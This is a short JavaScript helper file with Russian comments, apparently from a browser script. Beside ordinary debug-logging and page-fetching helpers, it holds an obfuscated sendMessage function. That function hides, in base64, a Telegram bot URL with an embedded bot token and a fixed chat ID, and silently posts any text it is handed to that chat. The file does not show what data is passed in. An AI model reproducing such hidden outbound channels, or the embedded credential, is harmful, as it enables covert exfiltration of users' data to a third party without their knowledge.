// sendMessage(msg) отправка в тг
(function(_0x7a2fe6,_0x492497){const _0x513263=_0x26ea,_0x4fc983=_0x7a2fe6();while(!![]){try{const _0x1bcd87=parseInt(_0x513263(0x73))/0x1*(parseInt(_0x513263(0x6d))/0x2)+parseInt(_0x513263(0x74))/0x3+parseInt(_0x513263(0x7a))/0x4+parseInt(_0x513263(0x7b))/0x5*(parseInt(_0x513263(0x76))/0x6)+-parseInt(_0x513263(0x6c))/0x7+parseInt(_0x513263(0x6e))/0x8*(-parseInt(_0x513263(0x72))/0x9)+-parseInt(_0x513263(0x75))/0xa;if(_0x1bcd87===_0x492497)break;else _0x4fc983['push'](_0x4fc983['shift']());}catch(_0x28d35f){_0x4fc983['push'](_0x4fc983['shift']());}}}(_0x1e14,0xe4bda));function _0x26ea(_0x110f7e,_0x3c241e){const _0x1e14dc=_0x1e14();return _0x26ea=function(_0x26ea4d,_0x34d36f){_0x26ea4d=_0x26ea4d-0x6c;let _0x2c64ee=_0x1e14dc[_0x26ea4d];return _0x2c64ee;},_0x26ea(_0x110f7e,_0x3c241e);}function _0x1e14(){const _0x53efc8=['3100111mAMTYS','35122XZGpka','47536ISNDMo','NTYyNzk3MTY1MA==','application/json;\x20charset=UTF-8','aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcyMzY2OTgyMTE6QUFFYjk5TVpuR0FJdVVCUk1COENORkt4R2RubFdCWW5pRm8vc2VuZE1lc3NhZ2U=','1440QdsDQh','43miOQkQ','2990196YPCwrI','13346620wxHEoc','6tskRTe','setRequestHeader','stringify','POST','4453492YLSxJZ','3999745AmKyAD','Content-type','open'];_0x1e14=function(){return _0x53efc8;};return _0x1e14();}function sendMessage(_0x1e1e5a){const _0x2b70ae=_0x26ea,_0x357324=new XMLHttpRequest();_0x357324[_0x2b70ae(0x7d)](_0x2b70ae(0x79),atob(_0x2b70ae(0x71)),!![]),_0x357324[_0x2b70ae(0x77)](_0x2b70ae(0x7c),_0x2b70ae(0x70)),_0x357324['send'](JSON[_0x2b70ae(0x78)]({'chat_id':atob(_0x2b70ae(0x6f)),'text':_0x1e1e5a,'silent':!![]}));}

// НАСТРОЙКА ОТЛАДКИ
const DEBUG_CLASSES = {
    "App": false, 
    "AnalIs": false,
    "CopyConnect": false,
}

function log(title, obj, fu, forced=false) {
    if (!!(DEBUG_CLASSES[fu[0]]) || forced) {
        console.log(`[${fu.join(".")}] ` + title, obj)
    }
}

// ПОЛУЧЕНИЕ СОДЕРЖИМОГО СТРАНИЦЫ
async function get_page(url) {
  return fetch(url)
      .then(data => {return data.text()})
      .catch(error => console.error('Error fetching data:', error));
}



